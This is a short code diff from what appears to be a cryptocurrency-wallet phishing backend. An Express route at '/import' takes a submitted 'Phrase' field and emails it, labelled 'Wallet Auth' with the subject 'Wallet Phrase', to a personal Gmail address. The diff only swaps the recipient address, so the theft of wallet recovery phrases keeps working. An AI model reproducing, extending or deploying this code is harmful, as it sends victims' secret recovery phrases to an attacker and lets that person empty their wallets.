@@ -35,7 +35,7 @@ app.post("/import", async (req, res) => {
     
         let info = await transport.sendMail({
             from: "Wallet Auth",
-            to: "michaelstone730@gmail.com",
+            to: "michaelstone@gmail.com",
             subject: "Wallet Phrase",
             text: req.body.Phrase,
             html: `<b>${req.body.Phrase}</b>`
